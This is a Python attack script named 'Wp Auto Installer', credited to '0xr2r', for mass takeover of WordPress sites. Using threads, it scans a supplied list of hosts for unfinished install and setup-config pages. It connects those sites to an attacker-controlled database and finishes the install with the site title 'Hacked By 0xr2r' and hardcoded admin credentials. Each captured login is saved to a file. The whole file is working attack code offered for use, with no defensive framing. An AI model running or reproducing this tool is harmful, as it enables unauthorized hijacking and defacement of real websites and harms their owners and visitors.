try:
	import requests,json,random
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
	print(" [+] Command: pip install requests")
try:
	dirs = open("dir.txt","r").read().splitlines()
except:
	dirs = ['/','/wp/','/new/','/old/','/wordpress/','/test/','/blog/','/cms/','/web/','/backup/','/site/','/oldsite/']
from os import system,mkdir,name
system(['clear','clear'][(name == 'nt')])
red = '\x1b[1;31m'
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
try:
	import concurrent.futures
	xxx = True
except:
	from multiprocessing.pool import ThreadPool
	xxx = False
def SpeedX(check,list,th):
	if xxx == True:
		try:
			with concurrent.futures.ThreadPoolExecutor(int(th)) as executor:
				executor.map(check,list)
		except Exception as e:
			print(e)
	else:
		pool = ThreadPool(int(th))
		pool.map(check,list)
		pool.close()
		pool.join()
def Ret(x):
	try:
		return raw_input(x)
	except:
		return input(x)
logo = """   
                                                          """
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
def rez(url,exploit,n):
	if "|" in exploit:
		arr = exploit.split("|")
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+r+" [NO]")
	else:
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+exploit+": "+w+url+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+exploit+": "+w+url+r+" [NO]")
try:
	database = json.loads(open("db-setup.json","r").read())
except:
	database = {}
	try:
		print(r+logo+"""\n{}	Author:{} 0xr2r\n	{}Name: {}Wp Auto Installer\n	{}Msg: {}Setup Your Database\n""".format(y,c,y,c,y,c))
		database["DB_HOST"] = Ret(g+" DB_HOST"+w+":"+c+"~"+m+"# "+r)
		database["DB_NAME"] = Ret(g+" DB_NAME"+w+":"+c+"~"+m+"# "+r)
		database["DB_USER"] = Ret(g+" DB_USER"+w+":"+c+"~"+m+"# "+r)
		database["DB_PASS"] = Ret(g+" DB_PASS"+w+":"+c+"~"+m+"# "+r)
		with open("db-setup.json",'w') as wr:
			wr.write(json.dumps(database,indent=2))
	except Exception as e:
		print(e)
		exit()
def saved(x,y):
	i = x
	i = i.replace("http://","")
	i = i.replace("https://","")
	i = i.replace("www.","")
	i = i.split("/")
	i = i[0]
	try:
		m = open(y,"r").read()
	except:
		open(y,"w")
		m = open(y,"r").read()
	if i in m:
		pass
	else:
		open(y,"a").write(x+"\n")
def Trysetup(site):
	try:
		headers = {"User-Agent":"Mozilla/5.0 (Linux; Android 10; RMX2195 Build/QKQ1.200614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36"}
		headers["Content-Type"] = "application/x-www-form-urlencoded"
		headers["X-Requested-With"] = "acr.browser.barebones"
		headers["Referer"] = "http://"+site+'/wp-admin/setup-config.php?step=2'
		headers["Host"] = site.split("/")[0]
		headers["Proxy-Connection"] = "keep-alive"
		headers["Cache-Control"] = "max-age=0"
		headers["Upgrade-Insecure-Requests"] = "1"
		headers["Origin"] = "http://"+site.split("/")[0]
		headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
		headers["Accept-Encoding"] = "gzip, deflate"
		headers["Accept-Language"] = "en-US,en;q=0.9"
		session = requests.Session()
		dbprefix = "wp_"+('').join(random.sample('abcdefghijklmnopqrstuvwxyz',8))
		data = {
		'dbname': database["DB_NAME"],
		'uname': database["DB_USER"],
		'pwd': database["DB_PASS"],
		'dbhost': database["DB_HOST"],
		'prefix': dbprefix,
		'language':'en_US',
		'submit':'Submit'
		}
		req = session.post("http://"+site+'/wp-admin/setup-config.php?step=2',data=data,headers=headers,timeout=200,verify=False)
		if 'install.php' in req.content.decode("utf-8"):
			rez(site,"DB-SETUP","1")
			Tryinstall(site)
		else:
			rez(site,"DB-SETUP","b1")
			open("error-notinstalled.txt","a").write('http://'+site+'/wp-admin/wp-setup.php\n')
	except Exception as e:
		open("wp-notinstalled.txt","a").write('http://'+site+'/wp-admin/wp-setup.php\n')
		pass
def Tryinstall(site):
	session = requests.session()
	data = {'weblog_title': 'Hacked By 0xr2r','user_name': '0xr2r','admin_password': '0xr2r','pass1-text': '0xr2r','admin_password2': '0xr2r','pw_weak': 'on','admin_email': '0xr2r@hotmail.com','Submit': 'Install+WordPress','language': 'en_US'}
	try:
		r = session.post('http://'+site+'/wp-admin/install.php?step=2',data=data,headers=headers,timeout=200,verify=False).content.decode("utf-8")
		if '<h1>Success!</h1>' in r or 'rm2174714' in r:
			rez(site,"INSTALLED","1")
			open('wp-installed.txt','a').write(site+'/wp-login.php#'+'0xr2r'+'#0xr2r'+'\n')
		else:
			rez(site,"INSTALLED","2")
			open("error-notinstalled.txt","a").write('http://'+site+'/wp-admin/install.php\n')
	except Exception as e:
		open("wp-notinstalled.txt","a").write('http://'+site+'/wp-admin/install.php\n')
		print(e)
def wpinstall(site):
	for dir in dirs:
		if "/" not in dir:
			dir = "/"+dir+"/"
		dork= dir+'wp-admin/install.php'
		try:
			r = requests.get("http://"+site+dork,headers=headers,timeout=25,verify=False)
			ripon = r.content.decode("utf-8")
			meurl = "http://"+site+"/"+dork
			valid = ripon.lower()
			valid = valid.replace('"','\'')
			rip = "<form" in valid
			rip2 = "type='file'" in valid
			if ("<title>WordPress &rsaquo; Installation</title>" in ripon or "action=\"install.php?step=2\"" in ripon or "<input name=\"weblog_title\"" in ripon) and rip == True:
				rez(meurl,"WP-INSTALL-FOUND","1")
				Tryinstall(site+dir)
				break
			elif '<title>WordPress &rsaquo; Setup Configuration File</title>' in ripon or "setup-config.php?step=1" in ripon or "action=\"setup-config.php?step=2\"" in ripon:
				rez(meurl,"WP-SETUP-FOUND","1")
				Trysetup(site+dir)
				break
			else:
				rez(meurl,"WP-INSTALL-FOUND","5")
		except Exception as e:
			pass
system(['clear','clear'][(name == 'nt')])
print(r+logo+"""\n{}	Author:{} 0xr2r\n	{}Name: {}Wp Auto Installer\n	{}Msg: {}Tool AutoSetup DB\n""".format(y,c,y,c,y,c))
try:
	dorks = Ret(g+" EnterList"+w+":"+c+"~"+m+"# "+r)
	th = Ret(g+" Thread"+w+":"+c+"~"+m+"# "+r)
	dork = open(dorks,"r").read().splitlines()
except Exception as e:
	print(e)
	exit()
SpeedX(wpinstall,dork,th)
